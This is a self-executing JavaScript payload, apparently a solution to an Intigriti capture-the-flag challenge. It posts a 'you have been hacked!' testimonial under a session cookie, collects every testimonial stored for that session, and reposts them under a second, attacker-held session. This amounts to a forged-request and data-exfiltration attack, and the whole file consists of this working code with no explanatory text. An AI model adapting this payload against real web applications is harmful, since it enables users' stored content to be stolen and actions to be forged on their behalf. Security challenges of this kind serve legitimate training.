(async function autoTestimonialFlow() {
    
    // STEP 1: First POST with session=1369
    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': 'session=1369',
            'Accept': '*/*',
            'Origin': 'https://challenge-0526.intigriti.io',
            'Referer': 'https://challenge-0526.intigriti.io/challenge'
        },
        credentials: 'include',
        body: JSON.stringify({ content: "you have been hacked!" })
    });

    // Delay
    await new Promise(r => setTimeout(r, 800));

    // STEP 2: Get ALL testimonials with session=1369
    let allTestimonials = [];
    
    try {
        const res = await fetch('/api/testimonials?cookie=1369', {
            method: 'GET',
            headers: {
                'Cookie': 'session=1369',
                'Accept': 'application/json'
            },
            credentials: 'include'
        });
        
        if (res.ok) {
            allTestimonials = await res.json();
        }
    } catch (e) {
        console.error("Fetch failed", e);
    }

    // STEP 3: Combine all testimonials into one string
    let combinedString = "Added victims testimonials: ";
    
    if (Array.isArray(allTestimonials)) {
        combinedString = allTestimonials
            .map(t => typeof t === 'string' ? t : t.content || JSON.stringify(t))
            .join(" | ");
    } else if (allTestimonials) {
        combinedString = JSON.stringify(allTestimonials);
    }

    // STEP 4: POST the combined string to session=1333
    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': 'session=1333',
            'Accept': '*/*',
            'Origin': 'https://challenge-0526.intigriti.io',
            'Referer': 'https://challenge-0526.intigriti.io/challenge'
        },
        credentials: 'include',
        body: JSON.stringify({ 
            content: combinedString 
        })
    });

    console.log("✅ Flow completed - Combined testimonials posted to session 1333");

})();   // Auto runs immediately